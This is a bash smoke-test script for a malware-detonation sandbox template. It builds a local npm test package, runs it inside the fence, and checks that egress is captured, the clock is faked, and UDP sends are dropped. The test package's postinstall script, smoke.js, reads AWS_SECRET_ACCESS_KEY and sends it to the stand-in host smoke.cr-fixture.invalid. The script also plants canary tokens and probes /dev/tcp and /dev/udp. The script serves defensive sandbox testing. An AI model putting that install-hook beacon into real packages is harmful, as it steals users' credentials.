#!/usr/bin/env bash
# Template build smoke detonation (DESIGN.md section 3.1). Runs as root at the end
# of the template build, and again in a fresh VM through the operator-only preview
# route POST /api/ops/smoke. Detonates a local test package (written here, our own
# code) through the real cr-detonate.sh and asserts the forge, the inner fence, the
# fake clock and npm 11 dependency lifecycle scripts all work, and prints the
# containment proof (cr-proof.sh: forge as root, skuid 1001 rules, drop counters,
# forged replies). Then it restores the template to a clean state so no smoke
# artifact reaches a scan VM.
set -euo pipefail

fail() { echo "cr-smoke: FAIL $*" >&2; exit 1; }
rand() { head -c 64 /dev/urandom | od -An -tx1 | tr -d ' \n' | head -c "$1"; }

BUNDLE=/etc/ssl/certs/ca-certificates.crt
cp -p "$BUNDLE" /tmp/ca-bundle.orig

PKG=/tmp/cr-smoke/package
rm -rf /tmp/cr-smoke && mkdir -p "$PKG" /root/in /root/.cr
cat >"$PKG/package.json" <<'JSON'
{"name":"cr-smoke-pkg","version":"1.0.0","main":"index.js","scripts":{"postinstall":"node smoke.js"}}
JSON
cat >"$PKG/index.js" <<'JS'
module.exports = { ok: true };
JS
cat >"$PKG/smoke.js" <<'JS'
const https = require("https");
const fs = require("fs");
const key = process.env.AWS_SECRET_ACCESS_KEY || "none";
https.get("https://smoke.cr-fixture.invalid/beacon?k=" + encodeURIComponent(key), (res) => {
  let body = "";
  res.on("data", (d) => (body += d));
  res.on("end", () => fs.writeFileSync("/tmp/cr-smoke-result", body));
}).on("error", (e) => { fs.writeFileSync("/tmp/cr-smoke-result", "error " + e.message); });
JS
tar -czf /root/in/target.tgz -C /tmp/cr-smoke package
printf '{"mode":"npm-package","name":"cr-smoke-pkg","install_timeout_s":60,"entry_timeout_s":8,"fake_rate":30,"proof":true}\n' >/root/in/run.json
SECRET="crsmoke$(rand 24)"
umask 077
{
  echo "AWS_ACCESS_KEY_ID=CRSMOKE$(rand 13 | tr 'a-f' 'A-F')"
  echo "AWS_SECRET_ACCESS_KEY=$SECRET"
  echo "NPM_TOKEN=crsmoke$(rand 30)"
  echo "GITHUB_TOKEN=crsmoke$(rand 30)"
  echo "OPENAI_API_KEY=crsmoke$(rand 30)"
} >/root/.cr/canary.env
printf '%s\n' "$SECRET" >/root/.cr/canary-patterns.txt
umask 022

/opt/cr/bin/cr-detonate.sh
OUT=/root/out

# The containment proof cr-detonate.sh ran with the forge and the fence up.
echo "cr-smoke: ---- containment proof (inside the VM, before any repo code) ----"
cat "$OUT/proof.txt" 2>/dev/null || echo "cr-smoke: proof.txt missing"
echo "cr-smoke: ---- end of proof ----"
jq -s -e 'map(select(.name=="containment_proof" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "containment proof failed: $(cat "$OUT/checks.jsonl")"

jq -e '.install.status == "completed"' "$OUT/result.json" >/dev/null || fail "install did not complete: $(cat "$OUT/result.json") $(tail -c 2000 "$OUT/install.err")"
jq -e '.entry.status == "completed"' "$OUT/result.json" >/dev/null || fail "entry did not complete: $(tail -c 2000 "$OUT/entry.err")"
jq -s -e 'map(select(.name=="egress_contained" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "egress not contained"
jq -s -e 'map(select(.name=="clock_accelerated" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "clock not accelerated: $(cat "$OUT/checks.jsonl")"
jq -s -e --arg s "$SECRET" 'map(select(.host=="smoke.cr-fixture.invalid" and .phase=="install" and .forged_kind=="json" and .tls=="intercepted" and (.path|contains($s)))) | length >= 1' \
  "$OUT/capture.jsonl" >/dev/null || fail "forge did not capture the smoke beacon: $(head -c 2000 "$OUT/capture.jsonl")"
[ "$(cat /tmp/cr-smoke-result)" = '{"ok":true}' ] || fail "postinstall did not receive the forged body: $(cat /tmp/cr-smoke-result)"
grep -q 'execve(".*node", \["node", "smoke.js"\]' "$OUT/trace.install" || fail "strace did not record the postinstall exec"
grep -qx /tmp/cr-smoke-result "$OUT/written.txt" || fail "written-file collection missed /tmp/cr-smoke-result"
for addr in 127.0.0.1 ::1; do
  if timeout 1 runuser -u cr -- bash -c "exec 3<>/dev/tcp/$addr/49983" 2>/dev/null; then fail "uid 1001 reached envd on $addr after the run"; fi
done
if timeout 2 runuser -u cr -- bash -c 'exec 3<>/dev/udp/192.0.2.1/9999; printf x >&3' 2>/dev/null; then :; fi
jq -e '.udp >= 1' "$OUT/egress_drops.json" >/dev/null 2>&1 || [ "$(/opt/cr/bin/cr-drops.sh cr_udp_drop)" -ge 1 ] || fail "the fence did not count a dropped UDP send"
echo "cr-smoke: PASS $(jq -c '{install:.install, entry:.entry, clock:.clock}' "$OUT/result.json")"

# Restore a clean template: no fence, no CA, no smoke artifacts, empty cr home.
nft flush ruleset
cp -p /tmp/ca-bundle.orig "$BUNDLE"
rm -rf /root/out /root/out.tgz /root/in /root/.cr /work /run/cr /etc/cr /tmp/cr-smoke /tmp/cr-smoke-result /tmp/ca-bundle.orig
rm -rf /home/cr && install -d -o cr -g cr -m 0750 /home/cr
pkill -KILL -u 1001 || true
